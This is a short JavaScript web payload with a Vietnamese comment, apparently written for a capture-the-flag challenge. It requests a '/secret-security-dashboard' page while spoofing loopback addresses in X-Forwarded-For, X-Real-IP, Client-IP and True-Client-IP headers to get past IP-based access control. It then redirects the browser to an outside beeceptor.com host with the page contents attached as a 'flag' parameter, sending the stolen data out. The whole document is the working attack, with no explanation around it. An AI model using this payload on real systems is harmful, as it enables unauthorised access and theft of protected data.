fetch('/secret-security-dashboard', {
    headers: {
        // Nhồi tất cả các header có khả năng giả mạo IP nội bộ
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'True-Client-IP': '127.0.0.1'
    }
})
.then(response => response.text())
.then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data);
});